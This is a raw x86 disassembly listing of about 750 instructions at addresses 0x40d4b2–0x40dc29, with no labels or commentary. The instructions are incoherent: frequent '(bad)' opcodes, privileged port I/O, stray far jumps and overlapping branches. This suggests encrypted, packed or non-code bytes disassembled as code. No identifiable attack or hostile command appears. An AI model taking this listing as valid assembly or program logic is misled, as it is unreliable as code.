  40d4b2:	or     eax,DWORD PTR [edi+0x39]
  40d4b5:	rcl    WORD PTR [ebx+0x17],cl
  40d4b9:	popf   
  40d4ba:	sub    eax,0x855fc959
  40d4bf:	loop   0x40d499
  40d4c1:	push   0x904d6b74
  40d4c6:	(bad)  
  40d4c7:	retf   
  40d4c8:	adc    al,0xb2
  40d4ca:	sub    ch,BYTE PTR [edi]
  40d4cc:	sub    ch,BYTE PTR [eax-0x4f]
  40d4cf:	nop
  40d4d0:	out    0xda,al
  40d4d2:	int    0x1f
  40d4d4:	cmc    
  40d4d5:	ret    0x445e
  40d4d8:	push   ds
  40d4d9:	add    eax,0xd9425fa3
  40d4de:	neg    eax
  40d4e0:	and    eax,0xe8fd58bc
  40d4e5:	jnp    0x40d4da
  40d4e7:	pop    eax
  40d4e8:	in     al,0x3
  40d4ea:	mov    bl,0xf5
  40d4ec:	xchg   edx,eax
  40d4ed:	bound  ebp,QWORD PTR [esp+eax*4]
  40d4f0:	arpl   WORD PTR ds:0x2be2e0f,ax
  40d4f6:	enter  0x4e5f,0xae
  40d4fa:	test   DWORD PTR [edi-0x2b695777],ecx
  40d500:	adc    BYTE PTR [esi-0x50ae06b8],dl
  40d506:	pop    ebx
  40d507:	mov    edx,0x7b1e6376
  40d50c:	sbb    DWORD PTR [ebx],eax
  40d50e:	push   ebx
  40d50f:	in     eax,dx
  40d510:	jns    0x40d4af
  40d512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d513:	rol    BYTE PTR [ecx-0x3f],cl
  40d516:	pop    ss
  40d517:	bound  eax,QWORD PTR [edi-0x260b0d49]
  40d51d:	adc    bl,BYTE PTR [ebp+0x7a]
  40d520:	jne    0x40d539
  40d522:	mov    esi,0xeb84abec
  40d527:	pop    eax
  40d528:	add    ah,BYTE PTR es:[esi+esi*1+0x60]
  40d52d:	dec    esi
  40d52e:	imul   esp
  40d530:	dec    eax
  40d531:	in     eax,0x17
  40d533:	push   0x29fb9e36
  40d538:	cs add eax,0xb8a78b26
  40d53e:	call   0xe6c6893a
  40d543:	dec    eax
  40d544:	jns    0x40d5b5
  40d546:	dec    DWORD PTR [esi+0x59fa83f6]
  40d54c:	outs   dx,BYTE PTR ds:[esi]
  40d54d:	test   BYTE PTR [esi+0x53],bl
  40d550:	cdq    
  40d551:	stos   BYTE PTR es:[edi],al
  40d552:	xchg   edx,eax
  40d553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d555:	pop    esp
  40d556:	lods   al,BYTE PTR ds:[esi]
  40d557:	les    esi,FWORD PTR [ecx+0x44dc9210]
  40d55d:	sub    DWORD PTR [ebx-0x1b],0xfffffff5
  40d561:	and    eax,0xacb863be
  40d566:	lock call 0xb2a1cc80
  40d56c:	dec    edi
  40d56d:	shl    BYTE PTR [edi+0x173c1bfc],1
  40d573:	scas   eax,DWORD PTR es:[edi]
  40d574:	aas    
  40d575:	or     eax,0xc16c6ba8
  40d57a:	add    eax,0xbd4966c8
  40d57f:	mov    bh,0xd6
  40d581:	inc    esp
  40d582:	xor    DWORD PTR [ebx-0x80],ebp
  40d585:	pop    ax
  40d587:	dec    eax
  40d588:	xchg   ecx,eax
  40d589:	inc    ecx
  40d58a:	test   DWORD PTR [esi-0xe23c3fb],ecx
  40d590:	hlt    
  40d591:	enter  0x4d42,0x9b
  40d595:	pop    ebx
  40d596:	lods   eax,DWORD PTR ds:[esi]
  40d597:	loop   0x40d5f8
  40d599:	in     eax,dx
  40d59a:	adc    esi,ebx
  40d59c:	jge    0x40d5d8
  40d59e:	fmul   DWORD PTR [ecx]
  40d5a0:	lock push DWORD PTR cs:[edx+0x79]
  40d5a5:	es jne 0x40d56c
  40d5a8:	sbb    dh,BYTE PTR [esi]
  40d5aa:	(bad)  
  40d5ab:	fisub  DWORD PTR ds:[edx-0x52]
  40d5af:	mov    dl,0xd5
  40d5b1:	add    BYTE PTR es:0x87bf8394,bl
  40d5b8:	scas   eax,DWORD PTR es:[edi]
  40d5b9:	cs gs inc esp
  40d5bc:	mov    ch,dh
  40d5be:	xor    ebp,DWORD PTR [esp+edi*2-0x4e]
  40d5c2:	clc    
  40d5c3:	retf   
  40d5c4:	or     eax,0x566b61d7
  40d5c9:	outs   dx,BYTE PTR ds:[esi]
  40d5ca:	sub    al,0x57
  40d5cc:	imul   esi,DWORD PTR [ecx],0xffffffeb
  40d5cf:	jae    0x40d644
  40d5d1:	pop    eax
  40d5d2:	sti    
  40d5d3:	outs   dx,BYTE PTR ds:[esi]
  40d5d4:	in     al,0x47
  40d5d6:	xchg   edi,eax
  40d5d7:	sbb    al,dl
  40d5d9:	arpl   WORD PTR [edx+0x26630999],di
  40d5df:	pop    ecx
  40d5e0:	popa   
  40d5e1:	out    0x36,al
  40d5e3:	test   eax,0x1e182122
  40d5e8:	jp     0x40d617
  40d5ea:	cwde   
  40d5eb:	iret   
  40d5ec:	or     bl,cl
  40d5ee:	pop    ss
  40d5ef:	push   cs
  40d5f0:	leave  
  40d5f1:	popf   
  40d5f2:	jge    0x40d584
  40d5f4:	hlt    
  40d5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5f6:	sahf   
  40d5f7:	jne    0x40d5f7
  40d5f9:	jb     0x40d5de
  40d5fb:	cmp    esi,edx
  40d5fd:	cmp    cl,bh
  40d5ff:	mov    dh,0xa2
  40d601:	push   edx
  40d602:	sub    BYTE PTR [eax+0x1c09037d],0x90
  40d609:	mov    dh,0x14
  40d60b:	jecxz  0x40d66e
  40d60d:	out    0x29,eax
  40d60f:	add    eax,0x30bf175b
  40d614:	fmul   st(0),st
  40d616:	rcl    bl,0x72
  40d619:	jmp    0xb3ef:0x1d9bb5ca
  40d620:	in     al,dx
  40d621:	outs   dx,DWORD PTR ds:[esi]
  40d622:	loopne 0x40d60c
  40d624:	je     0x40d5ce
  40d626:	and    al,0x33
  40d628:	or     ecx,ecx
  40d62a:	retf   
  40d62b:	lods   al,BYTE PTR ds:[esi]
  40d62c:	jne    0x40d5cc
  40d62e:	loop   0x40d5de
  40d630:	sbb    al,0x40
  40d632:	mov    al,0x96
  40d634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d635:	lods   al,BYTE PTR ds:[esi]
  40d636:	clc    
  40d637:	dec    esi
  40d638:	mov    bl,0xd0
  40d63a:	lods   al,BYTE PTR ds:[esi]
  40d63b:	pop    ss
  40d63c:	xchg   ecx,eax
  40d63d:	(bad)  
  40d63e:	imul   edx,ebp,0x26
  40d641:	mov    dh,0x5a
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	stc    
  40d645:	sbb    esi,DWORD PTR [ebp+0x3ef2232d]
  40d64b:	push   ebp
  40d64c:	aad    0xf5
  40d64e:	add    eax,0x3c7d9560
  40d653:	push   ecx
  40d654:	(bad)  
  40d656:	xchg   esi,eax
  40d657:	fiadd  WORD PTR [edi+0x4bbeeea3]
  40d65d:	sub    esp,DWORD PTR [edi+0x36b1f8cd]
  40d663:	pusha  
  40d664:	std    
  40d665:	xchg   ebp,eax
  40d666:	ret    
  40d667:	dec    edx
  40d668:	jae    0xc1314748
  40d66e:	inc    ebx
  40d66f:	mov    ebp,0xe4b0aadb
  40d674:	pop    esi
  40d675:	sar    BYTE PTR [esi+ebp*1-0x2453f130],0x60
  40d67d:	cmp    BYTE PTR [eax-0x7c],cl
  40d680:	loopne 0x40d6b1
  40d682:	jbe    0x40d62a
  40d684:	call   0xaa90:0xd0be5829
  40d68b:	nop
  40d68c:	pushf  
  40d68d:	dec    eax
  40d68e:	sub    al,0x54
  40d690:	cs pop eax
  40d692:	(bad)  
  40d693:	fnclex 
  40d695:	in     eax,0xac
  40d697:	mov    dh,0x13
  40d699:	mov    bh,0xd6
  40d69b:	push   ebp
  40d69c:	(bad)  
  40d69d:	push   ss
  40d69e:	push   0x1cfc1905
  40d6a3:	push   esi
  40d6a4:	fcmovbe st,st(1)
  40d6a6:	cdq    
  40d6a7:	cmp    bh,0x78
  40d6aa:	pop    ebp
  40d6ab:	cmp    ebx,DWORD PTR [ebx+0x55]
  40d6ae:	push   esp
  40d6af:	jbe    0x40d681
  40d6b1:	(bad)  
  40d6b2:	mov    eax,0x5eaaa79b
  40d6b7:	cmp    dh,BYTE PTR [esi-0x2d4f4aab]
  40d6bd:	mov    dh,0x25
  40d6bf:	sti    
  40d6c0:	jne    0x40d6f1
  40d6c2:	xor    DWORD PTR [esi+0x57c6be41],0xffffff83
  40d6c9:	mov    ebp,0xd90fb9d6
  40d6ce:	xor    cl,bh
  40d6d0:	sub    eax,0x9d0a0876
  40d6d5:	mov    ch,0x8a
  40d6d7:	adc    al,BYTE PTR [eax+0x5cbbf488]
  40d6dd:	clc    
  40d6de:	cmp    ecx,DWORD PTR [edx+0x4e]
  40d6e1:	sub    DWORD PTR [ebx+0x59],0x44f2f4bf
  40d6e8:	mov    esi,edi
  40d6ea:	sbb    al,0xc3
  40d6ec:	sub    esp,esi
  40d6ee:	les    ecx,FWORD PTR [ecx-0xb3f71ae]
  40d6f4:	icebp  
  40d6f5:	jle    0x40d765
  40d6f7:	rol    DWORD PTR [ebx+0x1475660e],cl
  40d6fd:	jmp    0x40d752
  40d6ff:	jp     0x40d6c0
  40d701:	xchg   ecx,eax
  40d702:	hlt    
  40d703:	jecxz  0x40d693
  40d705:	add    BYTE PTR [ebx+0x40],0xf9
  40d709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d70a:	fucomip st,st(5)
  40d70c:	sbb    eax,0x6151718c
  40d711:	push   esp
  40d712:	xor    cl,BYTE PTR [ebx+0x2499a02]
  40d718:	mov    ebp,0x80b64490
  40d71d:	daa    
  40d71e:	(bad)
  40d721:	jnp    0x40d71b
  40d723:	jnp    0x40d6cf
  40d725:	and    DWORD PTR [ebp-0x4e17f8c7],0x5cfbb91f
  40d72f:	and    bl,BYTE PTR [ebx+0x613bd0e2]
  40d735:	mov    cl,0x41
  40d738:	lods   al,BYTE PTR ds:[esi]
  40d739:	sbb    BYTE PTR [eax-0xf182a54],0x16
  40d740:	pop    ss
  40d741:	rcr    BYTE PTR [edx+0x82e2230],0xb5
  40d748:	or     DWORD PTR [esi],eax
  40d74a:	pop    ecx
  40d74b:	pop    es
  40d74c:	jne    0x40d731
  40d74e:	(bad)  
  40d74f:	dec    ebx
  40d750:	out    dx,eax
  40d751:	mov    ds:0x4508dbf9,al
  40d756:	or     al,0x93
  40d758:	jg     0x40d795
  40d75a:	sbb    eax,ebp
  40d75c:	xor    BYTE PTR [edx],0xf
  40d75f:	or     eax,0x701930b9
  40d764:	xchg   edx,edx
  40d766:	inc    ebp
  40d767:	adc    BYTE PTR [ebp+0x5068db12],ah
  40d76d:	inc    edi
  40d76e:	and    DWORD PTR [edi],ecx
  40d770:	xchg   ebp,eax
  40d771:	test   al,0xa3
  40d773:	jle    0x40d766
  40d775:	data16 add cl,BYTE PTR [edi-0x3ea4a018]
  40d77c:	outs   dx,DWORD PTR ds:[esi]
  40d77d:	(bad)  
  40d77e:	leave  
  40d77f:	cmp    DWORD PTR fs:[ecx],edi
  40d782:	cdq    
  40d783:	stos   BYTE PTR es:[edi],al
  40d784:	(bad)  
  40d785:	jp     0x40d76c
  40d787:	rol    DWORD PTR [ebp-0x72],cl
  40d78a:	icebp  
  40d78b:	dec    ecx
  40d78c:	cmp    al,0x36
  40d78e:	je     0x40d7d5
  40d790:	sbb    cl,BYTE PTR [ebp-0x4d]
  40d793:	sub    bh,BYTE PTR [ebx+0xf]
  40d796:	cwde   
  40d797:	ret    0xa7cb
  40d79a:	imul   edx,DWORD PTR [eax],0x1bce0c28
  40d7a0:	xor    cl,BYTE PTR [ebx-0x3e]
  40d7a3:	aas    
  40d7a4:	pop    ecx
  40d7a5:	clc    
  40d7a6:	dec    ebp
  40d7a7:	int3   
  40d7a8:	cmp    al,0xc9
  40d7aa:	or     ch,BYTE PTR ds:0xb741be5e
  40d7b0:	inc    edi
  40d7b1:	fwait
  40d7b2:	add    BYTE PTR [esi],0x57
  40d7b5:	push   edx
  40d7b6:	(bad)  
  40d7b7:	lea    esi,[edx+eiz*4]
  40d7ba:	cwde   
  40d7bb:	lahf   
  40d7bc:	mov    ds:0x18ca75dc,eax
  40d7c1:	jl     0x40d7e1
  40d7c3:	out    0xd9,eax
  40d7c5:	std    
  40d7c6:	adc    bl,BYTE PTR [ebp-0x340d800d]
  40d7cc:	xor    dl,ch
  40d7ce:	int    0xb6
  40d7d0:	loope  0x40d81b
  40d7d2:	mov    al,ds:0x897b43e1
  40d7d7:	test   esp,ebx
  40d7d9:	outs   dx,BYTE PTR ds:[esi]
  40d7da:	stos   BYTE PTR es:[edi],al
  40d7db:	or     al,0x87
  40d7dd:	xor    al,0x22
  40d7df:	jne    0x40d7b6
  40d7e1:	test   BYTE PTR es:[edi-0x9],al
  40d7e5:	fdivr  st(4),st
  40d7e7:	adc    al,0x82
  40d7e9:	mov    edi,0x9e611035
  40d7ee:	mov    ebx,0x2e1d1fd
  40d7f3:	repz call 0x1f6f:0x41026ee1
  40d7fb:	das    
  40d7fc:	pop    ebp
  40d7fd:	mov    ds:0xda5325b9,eax
  40d802:	div    DWORD PTR [ebx+0x732cc20a]
  40d808:	pop    ss
  40d809:	les    eax,FWORD PTR gs:[edx]
  40d80c:	pop    es
  40d80d:	gs out dx,al
  40d80f:	aam    0xac
  40d811:	inc    edx
  40d812:	shl    DWORD PTR [edx-0x1decc857],0x81
  40d819:	pop    ecx
  40d81a:	mov    ebx,eax
  40d81c:	leave  
  40d81d:	shl    BYTE PTR [edi],cl
  40d81f:	aas    
  40d820:	push   esp
  40d821:	pop    es
  40d822:	fsubrp st(1),st
  40d824:	and    esi,DWORD PTR [edi]
  40d826:	ins    DWORD PTR es:[edi],dx
  40d827:	sub    BYTE PTR [ebp-0x77656d73],al
  40d82d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d82e:	shl    al,0x2c
  40d831:	xchg   esp,eax
  40d832:	push   eax
  40d833:	mov    eax,ds:0xb4bf5caf
  40d838:	and    al,0x48
  40d83a:	and    BYTE PTR es:[edi-0x1ccf6d49],0x21
  40d842:	xor    BYTE PTR [edx-0x18e102b7],ch
  40d848:	push   es
  40d849:	mov    ds:0x50ad4a89,al
  40d84e:	inc    esi
  40d84f:	shl    DWORD PTR [ecx],1
  40d851:	or     ch,BYTE PTR [edi]
  40d853:	sub    eax,0x8031287a
  40d858:	xor    esp,DWORD PTR [edi]
  40d85a:	jnp    0x40d8d1
  40d85c:	fimul  DWORD PTR [edi]
  40d85e:	lea    edx,[ebx+0x7d1aba6e]
  40d864:	and    edx,DWORD PTR [eax-0x6]
  40d867:	sbb    bh,BYTE PTR [ebx-0x77]
  40d86a:	int    0x92
  40d86c:	jecxz  0x40d8b6
  40d86e:	inc    ebx
  40d86f:	dec    esi
  40d870:	ficom  DWORD PTR [ebx-0x2b]
  40d873:	inc    ebp
  40d874:	inc    eax
  40d875:	jg     0x40d8a5
  40d877:	data16 jne 0x40d82d
  40d87a:	dec    esi
  40d87b:	in     eax,0xe8
  40d87d:	outs   dx,DWORD PTR ds:[esi]
  40d87e:	(bad)  
  40d87f:	shl    BYTE PTR [esi-0x13ee094],1
  40d885:	and    ch,0x8f
  40d888:	cmp    eax,0xf0bd8125
  40d88d:	xor    DWORD PTR [ebx-0x36],ecx
  40d890:	xor    al,0xdf
  40d892:	in     eax,0x7f
  40d894:	push   ds
  40d895:	lods   eax,DWORD PTR ds:[esi]
  40d896:	lods   al,BYTE PTR ds:[esi]
  40d897:	pop    edi
  40d898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d899:	test   edi,ebx
  40d89b:	loope  0x40d887
  40d89d:	lds    esi,FWORD PTR [ebx]
  40d89f:	dec    edx
  40d8a0:	xor    dl,BYTE PTR [edx-0x22b4c3d0]
  40d8a6:	mov    al,0xd4
  40d8a8:	dec    ebp
  40d8a9:	arpl   WORD PTR [ecx-0x62],dx
  40d8ac:	push   ebx
  40d8ad:	or     eax,0xc4e4ce71
  40d8b2:	shl    DWORD PTR [esi+ebx*2],cl
  40d8b5:	pop    esp
  40d8b6:	and    DWORD PTR [edx-0x48a625b9],eax
  40d8bc:	sbb    al,0x9d
  40d8be:	lahf   
  40d8bf:	aam    0xce
  40d8c1:	jmp    0xe569:0x414f77ff
  40d8c8:	shl    DWORD PTR [edx-0x7514cc0d],1
  40d8ce:	fcom   st(3)
  40d8d0:	pop    ss
  40d8d1:	jle    0x40d87b
  40d8d3:	arpl   WORD PTR [esi+0x4d],si
  40d8d6:	cmp    al,BYTE PTR [esi+0x26]
  40d8d9:	push   eax
  40d8da:	scas   al,BYTE PTR es:[edi]
  40d8db:	stos   BYTE PTR es:[edi],al
  40d8dc:	adc    eax,0x82edfd95
  40d8e1:	(bad)  
  40d8e2:	cld    
  40d8e3:	ins    DWORD PTR es:[edi],dx
  40d8e4:	sar    BYTE PTR [edx+0x4e],0xa3
  40d8e8:	xor    eax,0xddbe540e
  40d8ed:	xor    BYTE PTR [esi-0x5d8b3ca9],bl
  40d8f3:	inc    esi
  40d8f4:	jbe    0x40d8e9
  40d8f6:	repz jl 0x40d962
  40d8f9:	cld    
  40d8fa:	dec    ebx
  40d8fb:	jbe    0x40d890
  40d8fd:	fwait
  40d8fe:	loopne 0x40d8d3
  40d900:	das    
  40d901:	shr    BYTE PTR [ebx+0x47],1
  40d904:	lahf   
  40d905:	(bad)  
  40d906:	push   esi
  40d907:	push   esp
  40d908:	les    ebp,FWORD PTR [edi-0x6]
  40d90b:	cdq    
  40d90c:	sahf   
  40d90d:	test   BYTE PTR [edx+edi*1],dh
  40d910:	or     eax,0xcea854f1
  40d915:	mov    ebp,0x744d24ea
  40d91a:	scas   eax,DWORD PTR es:[edi]
  40d91b:	and    BYTE PTR ds:0x9b0b60a2,0x3a
  40d922:	inc    esp
  40d923:	test   eax,0xc91d0683
  40d928:	dec    esi
  40d929:	inc    edi
  40d92a:	mov    ch,0xe5
  40d92c:	(bad)  
  40d92d:	popa   
  40d92e:	dec    edx
  40d92f:	fcmovb st,st(0)
  40d931:	lea    ebx,[ecx+esi*4-0xc]
  40d935:	push   edi
  40d936:	mov    dh,0xb3
  40d938:	or     esi,DWORD PTR [edi-0x70188d97]
  40d93e:	xchg   ecx,eax
  40d93f:	or     BYTE PTR [eax+0x42],al
  40d942:	ss add al,0x30
  40d945:	mov    dl,0x2b
  40d947:	nop
  40d948:	or     eax,0x1163f54f
  40d94d:	jle    0x40d99b
  40d94f:	fcmovnb st,st(6)
  40d951:	pop    ebx
  40d952:	inc    ebp
  40d953:	xor    dh,BYTE PTR [eax+eiz*4+0x2b]
  40d957:	cli    
  40d958:	dec    edi
  40d959:	shl    DWORD PTR [ecx+0x407abc74],1
  40d95f:	mov    ah,0xd0
  40d961:	iret   
  40d962:	sbb    bh,BYTE PTR [edx]
  40d964:	push   edi
  40d965:	jne    0x40d9aa
  40d967:	fisub  DWORD PTR [ecx+0x7e]
  40d96a:	pop    ebx
  40d96b:	sub    dh,BYTE PTR [ecx+0x153e8d93]
  40d971:	call   0x1fdd:0xf9f6743f
  40d978:	xor    DWORD PTR [esi+edi*4+0x1227f0ca],ecx
  40d97f:	push   ebp
  40d980:	adc    edi,edx
  40d982:	je     0x40d922
  40d984:	pop    ss
  40d985:	out    dx,al
  40d986:	fcom   DWORD PTR [ebp-0x1a]
  40d989:	dec    ebx
  40d98a:	pop    edx
  40d98b:	cmp    BYTE PTR [ebx-0x56],bh
  40d98e:	dec    ebx
  40d98f:	and    BYTE PTR [ecx+0x224dcc89],0x78
  40d996:	add    bh,al
  40d998:	cmp    DWORD PTR [ebx],edx
  40d99a:	or     edx,DWORD PTR [ebp+0xd]
  40d99d:	sub    eax,0x184c4115
  40d9a2:	ret    
  40d9a3:	ins    BYTE PTR es:[edi],dx
  40d9a4:	dec    DWORD PTR [eax]
  40d9a6:	fldenv [edx+0x33]
  40d9a9:	mov    DWORD PTR ds:0x1d1720d5,edx
  40d9af:	xor    DWORD PTR [esi-0x75],esp
  40d9b2:	pop    eax
  40d9b3:	out    0x2d,eax
  40d9b5:	and    dh,ch
  40d9b7:	cmp    eax,0xfb956812
  40d9bc:	aas    
  40d9bd:	mov    dl,0x52
  40d9bf:	(bad)  
  40d9c0:	icebp  
  40d9c1:	jmp    0x10143d9f
  40d9c6:	cs aam 0x51
  40d9c9:	pop    esi
  40d9ca:	(bad)  
  40d9cb:	loop   0x40d98c
  40d9cd:	pop    esi
  40d9ce:	loop   0x40d9c0
  40d9d0:	mov    eax,0xae6b4966
  40d9d5:	pop    esp
  40d9d6:	mov    ebx,0x497e2ec2
  40d9db:	rol    BYTE PTR [ecx],1
  40d9dd:	call   DWORD PTR cs:[edx-0x48]
  40d9e1:	jmp    FWORD PTR [edi-0x6fe617b1]
  40d9e7:	pop    edx
  40d9e8:	ror    BYTE PTR ss:[ebx-0x80],0x19
  40d9ed:	mov    ds:0x2977f098,al
  40d9f2:	arpl   WORD PTR [edx],sp
  40d9f4:	push   ecx
  40d9f5:	fcom   QWORD PTR [eax-0x6cb23b7a]
  40d9fb:	rcl    esi,cl
  40d9fd:	call   ecx
  40d9ff:	in     eax,dx
  40da00:	aam    0xe
  40da02:	and    ebx,DWORD PTR [edx-0x1a7b32]
  40da08:	fst    DWORD PTR [ebx+ecx*2]
  40da0b:	(bad)
  40da0e:	leave  
  40da0f:	scas   eax,DWORD PTR es:[edi]
  40da10:	mov    ebp,0x7438db6
  40da15:	sbb    bl,BYTE PTR [edx]
  40da17:	xchg   ecx,eax
  40da18:	mov    ebp,0x805b5769
  40da1d:	push   cs
  40da1e:	mov    eax,0x3dcadf0e
  40da23:	push   esi
  40da24:	add    BYTE PTR [edx+0x7],ch
  40da27:	inc    ecx
  40da28:	cmp    eax,0x8647628d
  40da2d:	(bad)  
  40da2e:	xchg   ecx,eax
  40da2f:	sbb    al,0xd9
  40da31:	jbe    0x40da34
  40da33:	jle    0x40da93
  40da35:	jmp    0x9fc4:0x4f2563b1
  40da3c:	cmp    al,bh
  40da3e:	dec    esi
  40da3f:	and    ch,0xe2
  40da42:	or     ebx,edi
  40da44:	(bad)  
  40da45:	jns    0x40da98
  40da47:	pop    edx
  40da48:	pop    eax
  40da49:	push   0xe762eaa4
  40da4e:	shl    DWORD PTR [ebp+0xe],1
  40da51:	shr    edi,0x99
  40da54:	adc    eax,0x7eec2689
  40da59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da5a:	jmp    0x44598cb4
  40da5f:	je     0x40dacf
  40da61:	adc    DWORD PTR [ebx+0x50],edi
  40da64:	out    0xfd,al
  40da66:	mov    WORD PTR [edi+0x7f8ae161],ss
  40da6c:	cdq    
  40da6d:	xor    al,0x5b
  40da6f:	pop    ds
  40da70:	outs   dx,DWORD PTR ds:[esi]
  40da71:	mov    ebx,0x4e1b7b19
  40da76:	push   eax
  40da77:	and    edx,DWORD PTR ds:0x95cd4312
  40da7d:	jno    0x40da5b
  40da7f:	add    dl,ch
  40da81:	ds cmp eax,0xd8a7665a
  40da87:	or     DWORD PTR [ecx],0xaca416aa
  40da8d:	pop    esi
  40da8e:	cmp    esp,DWORD PTR [ebx-0x1194f535]
  40da94:	test   eax,ebp
  40da96:	pop    ss
  40da97:	ret    0x5f0d
  40da9a:	mov    ah,0x39
  40da9c:	into   
  40da9d:	icebp  
  40da9e:	dec    ebx
  40da9f:	and    BYTE PTR [ecx+esi*8-0x481b78ec],bh
  40daa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daa7:	xor    BYTE PTR ds:0xe79fd515,0x1
  40daae:	fist   DWORD PTR [ebp-0x5a]
  40dab1:	pop    eax
  40dab2:	or     ebx,DWORD PTR [ecx+0x19]
  40dab5:	add    bh,BYTE PTR [ecx+0x7c567564]
  40dabb:	dec    ebp
  40dabc:	mov    ah,0x9e
  40dabe:	sub    al,0xdd
  40dac0:	push   ecx
  40dac1:	mov    ch,0x81
  40dac3:	adc    al,0x5
  40dac5:	jbe    0x40db3e
  40dac7:	sbb    ebx,eax
  40dac9:	mov    bh,0xfd
  40dacb:	icebp  
  40dacc:	pop    sp
  40dace:	loopne 0x40da70
  40dad0:	sub    eax,DWORD PTR [esi+0x3a116ab7]
  40dad6:	adc    eax,0xf161df46
  40dadb:	push   cs
  40dadc:	jno    0x40db03
  40dade:	lods   eax,DWORD PTR ds:[esi]
  40dadf:	(bad)
  40dae2:	fidivr WORD PTR [esp+ecx*8-0x10]
  40dae6:	mov    ebp,0xc0e8de44
  40daeb:	rol    ebp,1
  40daed:	data16 jg 0x40dac7
  40daf0:	fbstp  TBYTE PTR [ecx+eax*2]
  40daf3:	adc    BYTE PTR [ebp-0x2f],0x78
  40daf7:	adc    eax,0x6660c02c
  40dafc:	adc    cl,al
  40dafe:	cmp    ebp,DWORD PTR [ebx]
  40db00:	mov    esp,0xcb3c7c3c
  40db05:	lods   eax,DWORD PTR ds:[esi]
  40db06:	stos   DWORD PTR es:[edi],eax
  40db07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db08:	pop    edx
  40db09:	sbb    DWORD PTR [ebp+0x2e2bab59],ecx
  40db0f:	dec    edi
  40db10:	out    0x8b,al
  40db12:	mov    al,ds:0x8f34d711
  40db17:	cmp    eax,0x241e02e0
  40db1c:	popa   
  40db1d:	xchg   ebx,eax
  40db1e:	ja     0x40db2e
  40db20:	cwde   
  40db21:	add    dh,BYTE PTR [edx-0x5f]
  40db24:	repz fcomp QWORD PTR fs:[eax-0x7c]
  40db29:	lods   eax,DWORD PTR ds:[esi]
  40db2a:	sar    ecx,cl
  40db2c:	rcl    ebp,cl
  40db2e:	jmp    0x384e93dc
  40db33:	and    bl,cl
  40db35:	xchg   esp,eax
  40db36:	fcomp  QWORD PTR [edi]
  40db38:	adc    ebx,DWORD PTR [eax-0x743159b2]
  40db3e:	mov    edx,0x878633ad
  40db43:	adc    ah,BYTE PTR [edi]
  40db45:	xchg   esp,eax
  40db46:	mov    eax,es
  40db48:	dec    ebx
  40db49:	fstp   DWORD PTR [ebx+0x4ea40038]
  40db4f:	mov    ebx,0x743a8aea
  40db54:	addr16 repz inc ecx
  40db57:	push   ebx
  40db58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db59:	loopne 0x40db16
  40db5b:	ror    BYTE PTR [eax+0x7f64ce5e],0x8d
  40db62:	xchg   ebx,eax
  40db63:	pushf  
  40db64:	mov    esp,0x9efa612c
  40db69:	mov    al,ds:0xd7f6d1ac
  40db6e:	xlat   BYTE PTR ds:[ebx]
  40db6f:	mov    ds:0x3e61ef20,eax
  40db74:	cmp    BYTE PTR [edx-0x735d0ae2],cl
  40db7a:	xchg   esp,eax
  40db7b:	cmp    DWORD PTR ds:0x3572d444,ecx
  40db81:	or     BYTE PTR ds:0x430c0f5f,0xb3
  40db88:	add    al,0xa4
  40db8a:	fild   QWORD PTR [esi+0x19c51228]
  40db90:	pop    ebp
  40db91:	pop    esi
  40db92:	jecxz  0x40db99
  40db94:	cmp    al,0x38
  40db96:	add    DWORD PTR [ebx+0x37358e71],eax
  40db9c:	xor    DWORD PTR [bx+si-0x6c60],edi
  40dba1:	jae    0x40dbcc
  40dba3:	popa   
  40dba4:	mov    ebp,0xd90d3d4
  40dba9:	xchg   ecx,eax
  40dbaa:	xor    BYTE PTR [ebx+0x63],0xe0
  40dbae:	push   0xd725bbee
  40dbb3:	sub    al,0xd
  40dbb5:	adc    ebx,DWORD PTR [esi]
  40dbb7:	dec    ebp
  40dbb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbb9:	jle    0x40dbb2
  40dbbb:	icebp  
  40dbbc:	dec    edi
  40dbbd:	adc    ecx,DWORD PTR [edi+0x0]
  40dbc0:	arpl   WORD PTR [esi+0x33],ax
  40dbc3:	inc    ebx
  40dbc4:	mov    dh,0x8b
  40dbc6:	not    DWORD PTR [ebp-0x1]
  40dbc9:	sub    ecx,DWORD PTR [esi+0x4e]
  40dbcc:	test   al,0xaa
  40dbce:	dec    ebx
  40dbcf:	dec    ecx
  40dbd0:	bound  ebp,QWORD PTR [edx+0x38b63efe]
  40dbd6:	xor    dl,ah
  40dbd8:	loop   0x40dbca
  40dbda:	jns    0x40dbd2
  40dbdc:	(bad)  
  40dbdd:	outs   dx,DWORD PTR ds:[esi]
  40dbde:	push   0xffffffd3
  40dbe0:	push   cs
  40dbe1:	mov    ebp,0x90eda2cb
  40dbe6:	xor    cl,BYTE PTR [eax+ebp*4]
  40dbe9:	mov    ecx,0x6b190c8f
  40dbee:	std    
  40dbef:	ret    
  40dbf0:	fst    st(2)
  40dbf2:	ret    0x12ef
  40dbf5:	imul   edx,ebx,0x67
  40dbf8:	mov    ebx,ebx
  40dbfa:	or     al,0x30
  40dbfc:	les    ebp,FWORD PTR [esi]
  40dbfe:	jne    0x40dc6e
  40dc00:	pop    eax
  40dc01:	push   edi
  40dc02:	fidivr DWORD PTR [eax]
  40dc04:	lahf   
  40dc05:	out    0x1b,al
  40dc07:	dec    edi
  40dc08:	push   es
  40dc09:	ret    
  40dc0a:	(bad)  [edx]
  40dc0c:	or     dh,BYTE PTR [ecx-0x7c]
  40dc0f:	clc    
  40dc10:	adc    eax,0x7aea0e02
  40dc15:	repz ss jb 0x40dc64
  40dc19:	and    BYTE PTR [eax],dl
  40dc1b:	fdivr  QWORD PTR [edx-0x34]
  40dc1e:	rcl    BYTE PTR [ebp-0x2ef44d26],1
  40dc24:	mov    ds:0xf2d0e64a,eax
  40dc29:	or     BYTE PTR [edx+0x65],cl
